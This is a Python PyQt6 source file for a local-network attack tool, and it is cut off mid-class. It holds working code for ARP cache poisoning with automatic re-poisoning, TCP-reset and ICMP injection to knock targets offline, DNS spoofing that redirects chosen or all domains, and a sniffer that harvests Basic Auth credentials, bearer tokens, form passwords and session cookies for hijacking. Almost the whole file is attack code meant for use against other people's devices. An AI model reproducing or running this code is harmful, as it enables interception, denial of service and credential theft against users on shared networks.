import sys
import time
import struct
import socket
import base64
import threading
import platform
import ctypes
import os
import json
import re
import random
import asyncio
import multiprocessing
import subprocess
import queue as py_queue
import collections
from datetime import datetime

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QPushButton,
    QLabel, QTableWidget, QTableWidgetItem, QHeaderView, QProgressBar,
    QSplitter, QMessageBox, QFrame, QDialog, QCheckBox, QComboBox,
    QFormLayout, QGroupBox, QTabWidget, QSpinBox, QMenu, QLineEdit,
    QDialogButtonBox, QTextEdit, QSizePolicy, QFileDialog
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QColor, QBrush, QAction, QCursor

# ==========================================
# VISUALIZATION IMPORTS
# ==========================================
PYQTGRAPH_AVAILABLE = False
try:
    import pyqtgraph as pg
    PYQTGRAPH_AVAILABLE = True
except ImportError:
    pass

# ==========================================
# GLOBAL PLACEHOLDERS (LOADED DYNAMICALLY)
# ==========================================
SCAPY_AVAILABLE = False
conf = None
Ether = ARP = IP = UDP = TCP = ICMP = DNS = DNSQR = DNSRR = None
sniff = get_if_hwaddr = get_if_addr = srp = send = sr1 = sendp = None

# ==========================================
# THEME & CONFIG
# ==========================================
THEME = {
    "bg_app": "#182b2a", "bg_header": "#11201f", "bg_card": "#223f3c",
    "border": "#33524e", "accent": "#2dd4bf", "accent_text": "#0c1514",
    "text_p": "#F1F5F9", "text_s": "#809795", "danger": "#f87171",
    "log_bg": "#0f172a", "log_text": "#2dd4bf", "good": "#4ade80", "warn": "#facc15"
}

if PYQTGRAPH_AVAILABLE:
    pg.setConfigOption('background', THEME['bg_app'])
    pg.setConfigOption('foreground', THEME['text_s'])
    pg.setConfigOptions(antialias=True)

STYLESHEET = f"""
QMainWindow {{ background-color: {THEME['bg_app']}; }}
QWidget {{ font-family: "Consolas", "Segoe UI", sans-serif; font-size: 10pt; color: {THEME['text_p']}; }}
QFrame#Header {{ background-color: {THEME['bg_header']}; border-bottom: 1px solid {THEME['border']}; }}
QLabel#Logo {{ font-size: 18pt; font-weight: bold; color: {THEME['accent']}; letter-spacing: 2px; }}
QLabel#Sub {{ color: {THEME['text_s']}; font-size: 9pt; font-style: italic; }}
QFrame#Card {{ background-color: {THEME['bg_card']}; border: 1px solid {THEME['border']}; border-radius: 8px; }}
QLabel#CardTitle {{ font-weight: bold; font-size: 11pt; color: {THEME['accent']}; padding: 5px; border-bottom: 1px solid {THEME['border']}; }}
QTextEdit#SystemLog {{ background-color: {THEME['log_bg']}; border: 1px solid {THEME['border']}; color: {THEME['log_text']}; font-family: Consolas; font-size: 9pt; border-radius: 4px; }}
QTableWidget {{ background-color: {THEME['bg_app']}; border: 1px solid {THEME['border']}; gridline-color: {THEME['border']}; selection-background-color: {THEME['accent']}; }}
QHeaderView::section {{ background-color: {THEME['bg_header']}; color: {THEME['text_s']}; border: none; padding: 8px; font-weight: bold; }}
QPushButton {{ background-color: {THEME['bg_card']}; border: 1px solid {THEME['accent']}; color: {THEME['accent']}; padding: 6px 12px; border-radius: 4px; font-weight: bold; }}
QPushButton:hover {{ background-color: {THEME['accent']}; color: {THEME['accent_text']}; }}
QPushButton.danger {{ border-color: {THEME['danger']}; color: {THEME['danger']}; }}
QPushButton.danger:hover {{ background-color: {THEME['danger']}; color: white; }}
QDialog {{ background-color: {THEME['bg_app']}; color: {THEME['text_p']}; }}
QTabWidget {{ background-color: {THEME['bg_app']}; color: {THEME['text_p']}; }}
QTabWidget::pane {{ border: 1px solid {THEME['border']}; background-color: {THEME['bg_app']}; }}
QTabBar::tab {{ background-color: {THEME['bg_header']}; color: {THEME['text_s']}; padding: 8px; margin: 2px; border-radius: 4px; }}
QTabBar::tab:selected {{ background-color: {THEME['accent']}; color: {THEME['accent_text']}; }}
QGroupBox {{ background-color: {THEME['bg_card']}; border: 1px solid {THEME['border']}; border-radius: 6px; margin: 5px; padding: 10px; }}
QGroupBox::title {{ subcontrol-origin: margin; left: 10px; color: {THEME['accent']}; }}
QComboBox {{ background-color: {THEME['bg_card']}; border: 1px solid {THEME['border']}; color: {THEME['text_p']}; padding: 4px; }}
QSpinBox {{ background-color: {THEME['bg_card']}; border: 1px solid {THEME['border']}; color: {THEME['text_p']}; padding: 4px; }}
QCheckBox {{ color: {THEME['text_p']}; spacing: 8px; }}
QLabel {{ color: {THEME['text_p']}; }}
"""

CONFIG_FILE = "aegis_config.json"

def is_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def get_online_interface():
    if not SCAPY_AVAILABLE: return None
    try:
        route = conf.route.route("8.8.8.8")
        return route[3]
    except:
        return conf.iface

# ==========================================
# UTILS: ROBUST MAC RESOLVER
# ==========================================
def resolve_mac_robust(ip, iface_obj=None):
    if SCAPY_AVAILABLE:
        try:
            if iface_obj:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1, verbose=0, iface=iface_obj)
                if ans:
                    return ans[0][1].hwsrc.replace('-', ':').upper()
        except: pass

    try:
        if platform.system() == "Windows":
            output = subprocess.check_output(f"arp -a {ip}", shell=True).decode(errors='ignore')
            match = re.search(r"([0-9a-fA-F]{2}-){5}[0-9a-fA-F]{2}", output, re.IGNORECASE)
            if match:
                return match.group(0).replace('-', ':').upper()
        else:
            with open('/proc/net/arp', 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip:
                        mac = parts[3].upper()
                        if mac != "00:00:00:00:00:00":
                            return mac
    except: pass
    return None

# ==========================================
# CONFIG MANAGER
# ==========================================
class ConfigManager:
    @staticmethod
    def load():
        defaults = {
            "aggression": "Standard (0.5s)",
            "safe_mode": True,
            "surgical_dos": True,
            "threads": 150,
            "monitoring": True,
            "dns_spoof_all": False,
            "dns_redirect_ip": "",
            "dns_domains": ""
        }
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    defaults.update(json.load(f))
            except: pass
        return defaults

    @staticmethod
    def save(settings):
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(settings, f, indent=4)
        except: pass

# ==========================================
# SCANNERS
# ==========================================
class AsyncScanner(QThread):
    device_found = pyqtSignal(str, str, str)
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    log_msg = pyqtSignal(str)

    def __init__(self, my_ip, iface_obj, settings):
        super().__init__()
        self.my_ip = my_ip
        self.iface = iface_obj
        self.settings = settings
        self.scan_ports = [21, 22, 23, 80, 139, 443, 445, 3389, 8080, 62078]

    def get_mac_vendor(self, mac):
        if not SCAPY_AVAILABLE: return "Unknown"
        try: return conf.manufdb._get_manuf(mac) or "Unknown Vendor"
        except: return "Unknown Vendor"

    def get_hostname(self, ip):
        try: return socket.gethostbyaddr(ip)[0]
        except: return None

    def _normalize_mac(self, mac):
        if not mac: return None
        return mac.replace('-', ':').upper()

    def _read_arp_cache(self):
        devices = set()
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("arp -a", shell=True).decode(errors='ignore')
                entries = re.findall(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:-]+)', output)
                for ip, mac_raw in entries:
                    if ip == self.my_ip or ip.startswith("224.") or ip.endswith(".255"): continue
                    mac = self._normalize_mac(mac_raw)
                    if mac and mac != "FF:FF:FF:FF:FF:FF":
                        devices.add((ip, mac))
            else:
                with open('/proc/net/arp', 'r') as f:
                    next(f)
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 4:
                            ip = parts[0]
                            mac = self._normalize_mac(parts[3])
                            if mac != "00:00:00:00:00:00" and ip != self.my_ip:
                                devices.add((ip, mac))
        except Exception as e: self.log_msg.emit(f"[Cache Error] {e}")
        return devices

    async def fingerprint_device(self, ip, mac):
        vendor = self.get_mac_vendor(mac)
        loop = asyncio.get_running_loop()
        hostname = await loop.run_in_executor(None, self.get_hostname, ip)

        extra_info = []
        if hostname: extra_info.append(hostname)

        open_ports = []
        for port in self.scan_ports:
            try:
                conn = asyncio.open_connection(ip, port)
                reader, writer = await asyncio.wait_for(conn, timeout=0.15)
                open_ports.append(port)
                writer.close()
                await writer.wait_closed()
            except: pass

        os_guess = "Unknown Device"
        if 62078 in open_ports: os_guess = "iOS/Apple Device"
        elif 445 in open_ports or 139 in open_ports: os_guess = "Windows (SMB)"
        elif 3389 in open_ports: os_guess = "Windows (RDP)"
        elif 22 in open_ports: os_guess = "Linux/Unix (SSH)"
        elif 23 in open_ports: os_guess = "IoT/Router (Telnet)"
        elif 80 in open_ports or 443 in open_ports: os_guess = "Web Server/Device"
        elif 21 in open_ports: os_guess = "FTP Server"

        final_desc = f"{vendor}\n{os_guess}"
        if extra_info: final_desc += f" | {' '.join(extra_info)}"
        return ip, mac, final_desc

    async def run_scan_logic(self):
        try: subnet = f"{self.my_ip.rsplit('.', 1)[0]}.0/24"
        except: return

        if SCAPY_AVAILABLE:
            conf.use_pcap = True
        self.progress.emit(10)

        active_devices = set()
        if SCAPY_AVAILABLE:
            try:
                arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
                loop = asyncio.get_running_loop()
                ans, _ = await loop.run_in_executor(
                    None,
                    lambda: srp(arp_pkt, timeout=5, retry=2, inter=0.1, verbose=0, iface=self.iface)
                )
                for _, rcv in ans:
                    ip = rcv.psrc
                    mac = rcv.hwsrc.replace('-', ':').upper()
                    if ip != self.my_ip: active_devices.add((ip, mac))
            except Exception as e: pass

        self.progress.emit(40)
        cached_devices = self._read_arp_cache()
        all_devices = active_devices.union(cached_devices)
        self.progress.emit(60)

        tasks = []
        for ip, mac in all_devices:
            tasks.append(self.fingerprint_device(ip, mac))

        if tasks:
            results = await asyncio.gather(*tasks)
            seen = set()
            for ip, mac, desc in results:
                key = (ip, mac)
                if key not in seen:
                    self.device_found.emit(ip, mac, desc)
                    seen.add(key)
        self.progress.emit(100)

    def run(self):
        try:
            if platform.system() == 'Windows':
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.run_scan_logic())
            loop.close()
        except Exception as e: self.log_msg.emit(f"[Scan Error] {e}")
        finally: self.finished.emit()

class FastScanner(QThread):
    device_found = pyqtSignal(str, str, str)
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    log_msg = pyqtSignal(str)

    def __init__(self, my_ip, iface_obj, settings):
        super().__init__()
        self.my_ip = my_ip
        self.iface = iface_obj
        self.settings = settings
        self.ports = [80, 443, 445, 139, 22]

    async def check_port(self, ip, port, semaphore):
        async with semaphore:
            try:
                conn = asyncio.open_connection(ip, port)
                reader, writer = await asyncio.wait_for(conn, timeout=0.2)
                writer.close()
                await writer.wait_closed()
                return ip
            except: return None

    async def run_sweep(self):
        base_ip = self.my_ip.rsplit('.', 1)[0]
        tasks = []
        limit = self.settings.get("threads", 150)
        sem = asyncio.Semaphore(limit)
        
        for i in range(1, 255):
            target_ip = f"{base_ip}.{i}"
            if target_ip == self.my_ip: continue
            for p in self.ports:
                tasks.append(self.check_port(target_ip, p, sem))
        
        self.progress.emit(20)
        results = await asyncio.gather(*tasks)
        active_ips = set(ip for ip in results if ip is not None)
        self.progress.emit(60)

        for ip in active_ips:
            if SCAPY_AVAILABLE:
                try:
                    mac = resolve_mac_robust(ip, self.iface)
                    if mac:
                        self.device_found.emit(ip, mac, self.resolve_vendor(mac))
                except: pass

    def run(self):
        try:
            if platform.system() == 'Windows':
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.run_sweep())
            loop.close()
        except: pass
        self.progress.emit(100)
        self.finished.emit()

    def resolve_vendor(self, mac):
        if not SCAPY_AVAILABLE: return "Unknown"
        try: return conf.manufdb._get_manuf(mac) or "Unknown"
        except: return "Unknown"

# ==========================================
# ZERO-COPY ENGINE (Layer 2) - ROBUST
# ==========================================
class ZeroCopyEngine:
    def __init__(self, interface=None, log_callback=None):
        self.iface_obj = interface or get_online_interface()
        self.interface_name = self.iface_obj.name if hasattr(self.iface_obj, 'name') else str(self.iface_obj)
        self.log_callback = log_callback
        
        try:
            if SCAPY_AVAILABLE:
                self.my_mac = get_if_hwaddr(self.iface_obj)
                self.my_ip = get_if_addr(self.iface_obj)
                self.my_mac_bytes = bytes.fromhex(self.my_mac.replace(':', '').replace('-', ''))
            else:
                self.my_mac = None; self.my_ip = None
        except Exception as e:
            self._log(f"[ENGINE CRITICAL] Interface error: {e}")
            self.my_mac = None; self.my_ip = None
        
        self.sock = None
        self.use_fallback = False
        self.running = False
        self.targets = {} 
        self.lock = threading.Lock()
        
        self.failed_attempts = 0
        self.max_failures = 5

    def _log(self, msg):
        if self.log_callback:
            self.log_callback(msg)
        else:
            print(msg)

    def _init_socket(self):
        if self.sock: return
        
        if platform.system() == "Windows" and SCAPY_AVAILABLE and not conf.use_pcap:
            self._log("[ENGINE WARN] Npcap not detected. Raw sockets may be unstable.")

        try:
            if platform.system() == "Windows" and SCAPY_AVAILABLE:
                self.sock = conf.L2socket(iface=self.iface_obj)
            else:
                self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
                self.sock.bind((self.interface_name, 0))
            
            self.use_fallback = False
            self._log(f"[ENGINE] Zero-Copy Socket initialized on {self.interface_name}")

        except Exception as e:
            self._log(f"[ENGINE ERROR] Raw Socket failed: {e}")
            self._log("[ENGINE] Engaging Scapy Fallback Mode (Slower but Stable).")
            self.use_fallback = True
            self.sock = None

    def _pack_mac(self, mac_str):
        return bytes.fromhex(mac_str.replace(':', '').replace('-', ''))

    def create_raw_arp(self, src_mac_bytes, dst_mac_bytes, sender_ip, target_ip, opcode=2):
        try:
            snd_ip_bin = socket.inet_aton(sender_ip)
            tgt_ip_bin = socket.inet_aton(target_ip)
            frame = struct.pack('!6s6sHHHBBH6s4s6s4s', 
                                dst_mac_bytes, src_mac_bytes, 0x0806, 
                                1, 0x0800, 6, 4, opcode, 
                                src_mac_bytes, snd_ip_bin, dst_mac_bytes, tgt_ip_bin)
            return frame
        except: return None

    def start(self):
        if self.running: return
        self.running = True
        self._init_socket()
        threading.Thread(target=self._fast_loop, daemon=True).start()

    def _fast_loop(self):
        while self.running:
            if not self.targets:
                time.sleep(0.1); continue

            with self.lock:
                active_targets = list(self.targets.values())

            if not self.sock and not self.use_fallback:
                self._init_socket()
            
            if not self.sock and not self.use_fallback:
                time.sleep(1); continue

            for data in active_targets:
                now = time.time()
                effective_interval = data['interval_base'] * random.uniform(0.8, 1.2)

                if now - data['last'] >= effective_interval:
                    try:
                        if self.use_fallback and SCAPY_AVAILABLE:
                            # Fallback Mode
                            pkt_v = Ether(data['pkt_to_victim'])
                            pkt_g = Ether(data['pkt_to_gateway'])
                            for _ in range(data['burst']):
                                sendp(pkt_v, iface=self.iface_obj, verbose=0)
                                sendp(pkt_g, iface=self.iface_obj, verbose=0)
                                time.sleep(0.01) # Stability throttle
                        elif self.sock:
                            # Fast Mode
                            for _ in range(data['burst']):
                                self.sock.send(data['pkt_to_victim'])
                                self.sock.send(data['pkt_to_gateway'])
                        
                        data['last'] = now
                        self.failed_attempts = 0 # Reset counter on success
                        
                        if data['dos_mode']:
                            time.sleep(0.005)
                            
                    except Exception as e:
                        self.failed_attempts += 1
                        self._log(f"[ENGINE] Transmission error #{self.failed_attempts}: {e}")
                        
                        if self.failed_attempts >= self.max_failures and not self.use_fallback:
                            self._log("[ENGINE] Too many failures. Permanently switching to Scapy fallback.")
                            self.use_fallback = True
                            if self.sock:
                                try: self.sock.close()
                                except: pass
                            self.sock = None
                        else:
                            self.sock = None 
                            
            time.sleep(0.01)

    def add_target(self, ip, mac, gateway_ip, gateway_mac, interval=0.5, dos_mode=False, surgical_dos=True):
        if not gateway_mac or gateway_mac.lower() in ["ff:ff:ff:ff", "ff:ff:ff:ff:ff:ff"]: return

        victim_mac_b = self._pack_mac(mac)
        gateway_mac_b = self._pack_mac(gateway_mac)

        pkt_to_victim = self.create_raw_arp(
            src_mac_bytes=self.my_mac_bytes, dst_mac_bytes=victim_mac_b,
            sender_ip=gateway_ip, target_ip=ip, opcode=2
        )

        pkt_to_gateway = self.create_raw_arp(
            src_mac_bytes=self.my_mac_bytes, dst_mac_bytes=gateway_mac_b,
            sender_ip=ip, target_ip=gateway_ip, opcode=2
        )

        burst_count = 1 if interval <= 0.1 else 5

        with self.lock:
            self.targets[ip] = {
                'pkt_to_victim': pkt_to_victim,
                'pkt_to_gateway': pkt_to_gateway,
                'interval_base': interval,
                'burst': burst_count,
                'last': 0.0,
                'dos_mode': dos_mode
            }
        self.start()

    def remove_target(self, ip):
        with self.lock:
            if ip in self.targets: del self.targets[ip]
    
    def force_burst(self, ip):
        packets = []
        with self.lock:
            if ip in self.targets:
                data = self.targets[ip]
                packets = [data['pkt_to_victim'], data['pkt_to_gateway']]
        
        if packets:
            try:
                if self.use_fallback and SCAPY_AVAILABLE:
                    for _ in range(3):
                        for p in packets: sendp(Ether(p), iface=self.iface_obj, verbose=0)
                elif self.sock:
                    for _ in range(5): 
                        for p in packets: self.sock.send(p)
            except: pass

    def stop(self):
        self.running = False
        if self.sock:
            try: self.sock.close()
            except: pass

# ==========================================
# MODULES
# ==========================================

class ReactiveArpGuard(QThread):
    log_signal = pyqtSignal(str) 

    def __init__(self, engine):
        super().__init__()
        self.engine = engine
        self.running = True
        
    def run(self):
        if not SCAPY_AVAILABLE: return
        
        def arp_monitor_callback(pkt):
            if not self.running: return
            if ARP in pkt and pkt[ARP].op in [1, 2]:
                src_ip = pkt[ARP].psrc
                if src_ip in self.engine.targets:
                    if pkt[ARP].hwsrc.lower() != self.engine.my_mac.lower():
                        self.engine.force_burst(src_ip)
                        self.log_signal.emit(f"[REACTIVE] Countered ARP attempt from {src_ip}")
                            
        while self.running:
            try:
                sniff(filter="arp", prn=arp_monitor_callback, store=0, timeout=1, iface=self.engine.interface_name)
            except: pass

    def stop(self):
        self.running = False
        self.wait()

class ProtocolSlayer(QThread):
    def __init__(self, interface_name, my_ip, gateway_ip):
        super().__init__()
        self.iface = interface_name
        self.my_ip = my_ip
        self.gateway_ip = gateway_ip
        self.running = True
        self.targets = set()
        self.lock = threading.Lock()
        self.pkt_counter = 0 
        self.rate_limit_data = {}
        self.RATE_LIMIT_HZ = 50   
        self.BUCKET_SIZE = 20     

    def add_target(self, ip):
        with self.lock: 
            self.targets.add(ip)
            self.rate_limit_data[ip] = {'tokens': self.BUCKET_SIZE, 'last_update': time.time()}

    def remove_target(self, ip):
        with self.lock: 
            if ip in self.targets: self.targets.remove(ip)
            if ip in self.rate_limit_data: del self.rate_limit_data[ip]

    def _check_rate_limit(self, ip):
        now = time.time()
        with self.lock:
            if ip not in self.rate_limit_data: return False
            bucket = self.rate_limit_data[ip]
            elapsed = now - bucket['last_update']
            bucket['tokens'] += elapsed * self.RATE_LIMIT_HZ
            if bucket['tokens'] > self.BUCKET_SIZE: bucket['tokens'] = self.BUCKET_SIZE
            bucket['last_update'] = now
            if bucket['tokens'] >= 1:
                bucket['tokens'] -= 1
                return True
            return False

    def run(self):
        if not SCAPY_AVAILABLE: return

        def slayer_callback(pkt):
            if not self.running: return
            self.pkt_counter += 1
            if self.pkt_counter % 3 != 0: return

            if not pkt.haslayer(IP): return
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            
            if src_ip == self.my_ip: return

            target_ip = None
            if src_ip in self.targets: target_ip = src_ip
            elif dst_ip in self.targets: target_ip = dst_ip
            
            if not target_ip: return
            if not self._check_rate_limit(target_ip): return

            if pkt.haslayer(TCP):
                tcp = pkt[TCP]
                if tcp.flags.R or tcp.flags.F: return 
                try:
                    if dst_ip == target_ip:
                        rst = IP(src=src_ip, dst=target_ip) / TCP(sport=tcp.sport, dport=tcp.dport, flags="R", seq=tcp.seq, ack=0)
                        send(rst, verbose=0, iface=self.iface)
                    elif src_ip == target_ip:
                        rst = IP(src=dst_ip, dst=target_ip) / TCP(sport=tcp.dport, dport=tcp.sport, flags="R", seq=tcp.ack, ack=0)
                        send(rst, verbose=0, iface=self.iface)
                except: pass

            elif pkt.haslayer(UDP) and src_ip == target_ip:
                try:
                    icmp_pkt = IP(src=self.gateway_ip, dst=target_ip) / ICMP(type=3, code=3) / pkt[IP]
                    send(icmp_pkt, verbose=0, iface=self.iface)
                except: pass

        while self.running:
            try:
                sniff(filter="ip", prn=slayer_callback, store=0, timeout=0.5, iface=self.iface)
            except: pass

    def stop(self):
        self.running = False
        self.wait()

class DnsSpoofer(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, interface, redirect_ip, domains=None, spoof_all=False):
        super().__init__()
        self.interface = interface
        self.redirect_ip = redirect_ip
        self.domains = [d.encode() if isinstance(d, str) else d for d in (domains or [])]
        self.spoof_all = spoof_all
        self.running = True

    def run(self):
        if not SCAPY_AVAILABLE:
            self.log_signal.emit("[DNS] Error: Scapy not available.")
            return

        self.log_signal.emit(f"[DNS] Active. Redirecting to {self.redirect_ip}")
        if self.spoof_all:
             self.log_signal.emit("[DNS] Mode: WILDCARD (Spoofing ALL domains)")
        else:
             self.log_signal.emit(f"[DNS] Targets: {[d.decode() for d in self.domains]}")

        def dns_responder(pkt):
            if not self.running: return
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(IP) and pkt.haslayer(UDP):
                qname = pkt[DNSQR].qname
                should_spoof = self.spoof_all
                if not should_spoof:
                    for d in self.domains:
                        if d in qname:
                            should_spoof = True
                            break

                if should_spoof:
                    try:
                        spoofed_pkt = (
                            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                            DNS(
                                id=pkt[DNS].id,
                                qr=1,
                                aa=1,
                                qd=pkt[DNS].qd,
                                an=DNSRR(rrname=qname, rdata=self.redirect_ip)
                            )
                        )
                        # Send twice to win race condition
                        send(spoofed_pkt, verbose=0, iface=self.interface)
                        send(spoofed_pkt, verbose=0, iface=self.interface)
                        self.log_signal.emit(f"[DNS] Redirected {qname.decode().strip('.')} -> {self.redirect_ip}")
                    except Exception as e:
                        self.log_signal.emit(f"[DNS] Error crafting packet: {e}")

        try:
            sniff(filter="udp port 53", prn=dns_responder, store=0, iface=self.interface, stop_filter=lambda x: not self.running)
        except Exception as e:
            self.log_signal.emit(f"[DNS] Critical Failure: {e}")

    def stop(self):
        self.running = False
        self.wait()

class TargetHealthMonitor(QThread):
    status_update = pyqtSignal(str, str, str)  # IP, Status Text, Color Hex
    latency_update = pyqtSignal(str, float)    # IP, Latency (ms)

    def __init__(self):
        super().__init__()
        self.targets = set()
        self.running = True
        self.lock = threading.Lock()
        self.strikes = {}

    def add_target(self, ip):
        with self.lock:
            self.targets.add(ip)
            self.strikes[ip] = 0

    def remove_target(self, ip):
        with self.lock:
            if ip in self.targets: self.targets.remove(ip)
            if ip in self.strikes: del self.strikes[ip]

    def run(self):
        while self.running:
            with self.lock:
                current_targets = list(self.targets)

            if not current_targets:
                time.sleep(1)
                continue

            batch_size = 50
            results = {}
            for i in range(0, len(current_targets), batch_size):
                chunk = current_targets[i:i + batch_size]
                chunk_results = self._ping_batch(chunk)
                results.update(chunk_results)

            for ip, latency_ms in results.items():
                with self.lock:
                    if ip not in self.strikes: continue
                    if latency_ms is None: self.strikes[ip] += 1
                    else: self.strikes[ip] = 0
                    s_count = self.strikes[ip]

                graph_val = latency_ms if latency_ms is not None and latency_ms > 0 else 0.0
                self.latency_update.emit(ip, graph_val)

                if s_count >= 3:
                    self.status_update.emit(ip, "[SUCCESS] DOWN", THEME['danger'])
                elif latency_ms is not None:
                    if latency_ms == -1:
                        txt = "ALIVE"
                        col = THEME['good']
                    else:
                        txt = f"ONLINE {int(latency_ms)}ms"
                        col = THEME['warn'] if latency_ms > 500 else THEME['good']
                    self.status_update.emit(ip, txt, col)
                else:
                    self.status_update.emit(ip, "DROPPING...", THEME['warn'])

            time.sleep(1.0)

    def _ping_batch(self, ips):
        procs = {}
        results = {}
        is_win = platform.system().lower() == 'windows'
        param = '-n' if is_win else '-c'
        timeout_param = '-w' if is_win else '-W'
        timeout_val = '500' if is_win else '1'
        creation_flags = 0x08000000 if is_win else 0

        for ip in ips:
            cmd = ['ping', param, '1', timeout_param, timeout_val, ip]
            try:
                procs[ip] = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, creationflags=creation_flags, text=True)
            except: 
                results[ip] = None

        for ip, proc in procs.items():
            try:
                out, _ = proc.communicate(timeout=1.0)
                if proc.returncode == 0:
                    match = re.search(r"time[=<]([0-9\.]+)\s*ms", out, re.IGNORECASE)
                    if match: results[ip] = float(match.group(1))
                    else: results[ip] = -1 
                else: results[ip] = None
            except:
                proc.kill()
                results[ip] = None
        return results

    def stop(self):
        self.running = False
        self.wait()

# ==========================================
# SNIFFER
# ==========================================

def sniffer_process_entry(queue, interface_name, settings):
    # Process-safe import (Multiprocessing spawns new interpreter)
    try:
        from scapy.all import sniff, IP, TCP, UDP
    except ImportError: return

    # --- FIXED REGEX PATTERNS (Using rb'' to prevent escape collisions) ---
    
    # 1. Basic Auth
    ptn_auth = re.compile(rb'Authorization: Basic ([a-zA-Z0-9+/=]+)', re.IGNORECASE)
    
    # 2. Post Data (User/Pass/Login)
    ptn_post = re.compile(rb'(user=|pass=|password=|email=|login=)([^& \r\n]+)', re.IGNORECASE)
    
    # 3. Cookies
    ptn_cookie = re.compile(rb'(Cookie|Set-Cookie):\s*([^\r\n]+)', re.IGNORECASE)
    
    # 4. Bearer Tokens
    ptn_bearer = re.compile(rb'Bearer\s+([a-zA-Z0-9_\-\.~+/]+=*)', re.IGNORECASE)
    
    # 5. JSON Auth
    # Fixed "unterminated character set" crash by simplifying [^"\\] to [^"]
    ptn_json_login = re.compile(rb'"(?:password|pass|pwd|token|auth)"\s*:\s*"([^"]{5,})"', re.IGNORECASE)
    
    # 6. Form URL Encoded
    ptn_form_urlencoded = re.compile(rb'(?:^|&)(?:password|pass|pwd|token|auth|session)=([^&\r\n]{5,})', re.IGNORECASE)

    high_value_keywords = [b'session', b'sid', b'token', b'auth', b'jwt', b'php', b'asp', b'jsession', b'login', b'user']
    garbage_keywords = [b'_ga', b'_gid', b'fbp', b'ads', b'tracker', b'pixel']

    def smart_decode(raw_bytes):
        try:
            token = raw_bytes.strip()
            # Attempt Base64 decode if it looks like base64
            if len(token) % 4 == 0 and re.match(b'^[a-zA-Z0-9+/=]+$', token):
                decoded_bytes = base64.b64decode(token, validate=True)
                return f"{decoded_bytes.decode('utf-8')} (Decoded)"
            return token.decode('utf-8', errors='ignore')
        except:
            return raw_bytes.decode('utf-8', errors='ignore')

    def packet_callback(pkt):
        try:
            if not pkt.haslayer(IP): return
            src = pkt[IP].src
            
            # --- Host/OS Detection ---
            if settings.get('monitoring', True):
                ttl = pkt[IP].ttl
                os_guess = None
                if ttl == 128: os_guess = "Windows"
                elif ttl == 64: os_guess = "Linux/Android"
                elif ttl == 255: os_guess = "Cisco/Network"
                
                host_type = None
                if pkt.haslayer(UDP):
                    payload = bytes(pkt[UDP].payload)
                    if b'_googlecast' in payload: host_type = "Chromecast"
                    elif b'_airplay' in payload: host_type = "Apple Device"
                    elif b'spotify' in payload: host_type = "Spotify Connect"
                
                if os_guess or host_type:
                    queue.put(("HOST", src, host_type, os_guess))

            # --- Credential Harvesting ---
            if pkt.haslayer(TCP) and pkt[TCP].payload:
                payload = bytes(pkt[TCP].payload)
                
                # 1. Basic Auth
                m_auth = ptn_auth.search(payload)
                if m_auth:
                    queue.put(("CRED", src, "BASIC AUTH", smart_decode(m_auth.group(1))))

                # 2. Bearer Tokens
                if b'Authorization:' in payload:
                    m_bearer = ptn_bearer.search(payload)
                    if m_bearer:
                        token = m_bearer.group(1)
                        if len(token) > 20: 
                            clean_token = smart_decode(token)
                            display_token = clean_token[:100] + "..." if len(clean_token) > 100 else clean_token
                            queue.put(("CRED", src, "BEARER TOKEN", display_token))

                # 3. JSON Auth
                m_json = ptn_json_login.search(payload)
                if m_json:
                    queue.put(("CRED", src, "JSON AUTH", smart_decode(m_json.group(1))))

                # 4. POST Data & Forms
                if b'POST' in payload or b'user=' in payload:
                    m_post = ptn_post.findall(payload)
                    if m_post:
                        decoded = [f"{k.decode()}{smart_decode(v)}" for k, v in m_post]
                        queue.put(("CRED", src, "POST DATA", ", ".join(decoded)))
                    
                    m_urlenc = ptn_form_urlencoded.search(payload)
                    if m_urlenc:
                        queue.put(("CRED", src, "FORM LOGIN", smart_decode(m_urlenc.group(1))))

                # 5. Cookie Hijacking
                m_cookie = ptn_cookie.search(payload)
                if m_cookie:
                    cookie_raw = m_cookie.group(2)
                    lower_raw = cookie_raw.lower()
                    if any(kw in lower_raw for kw in high_value_keywords) and not any(gk in lower_raw for gk in garbage_keywords):
                        cookie_str = smart_decode(cookie_raw)
                        if len(cookie_str) > 60: cookie_str = cookie_str[:57] + "..."
                        queue.put(("COOKIE", src, "SESSION HIJACK", cookie_str))
        except: pass

    try:
        sniff(iface=interface_name, filter="tcp or udp or arp", prn=packet_callback, store=0)
    except: pass

class ProcessSniffer(QThread):
    cred_found = pyqtSignal(str, str, str)
    host_info = pyqtSignal(str, str, str)
    cookie_found = pyqtSignal(str, str, str)

    def __init__(self, iface_name, settings):
        super().__init__()
        self.iface_name = iface_name
        self.settings = settings
        self.queue = multiprocessing.Queue()
        self.proc = None
        self.running = True

    def run(self):
        self.proc = multiprocessing.Process(target=sniffer_process_entry, args=(self.queue, self.iface_name, self.settings))
        self.proc.daemon = True
